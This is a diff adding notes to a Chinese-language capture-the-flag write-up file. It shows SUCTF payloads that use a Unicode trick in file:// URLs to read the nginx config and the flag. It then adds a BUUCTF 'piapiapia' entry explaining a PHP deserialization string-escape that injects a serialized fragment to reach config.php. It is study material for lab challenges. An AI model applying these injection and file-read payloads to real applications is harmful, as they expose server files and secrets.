@@ -562,3 +562,25 @@ payload:
 `/getUrl/?url=file://suctf.c℆sr/local/nginx/conf/nginx.conf`
 
 `/getUrl?url=file://suctf.c℆sr/fffffflag`
+
+
+
+# buuctf piapiapia
+
+反序列化字符串逃逸
+
+需要逃逸的字符串为:
+
+";}s:5:"photo";s:10:"config.php";}
+
+//flag在config.php中
+
+因为filter函数把where换成了hacker,多了一个字节
+
+所以存在反序列化逃逸
+
+**注意:**
+
+因为nickname的长度要<10,所以要把nickname转换成数组
+
+![image-20240506235057793](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240506235057793.png)
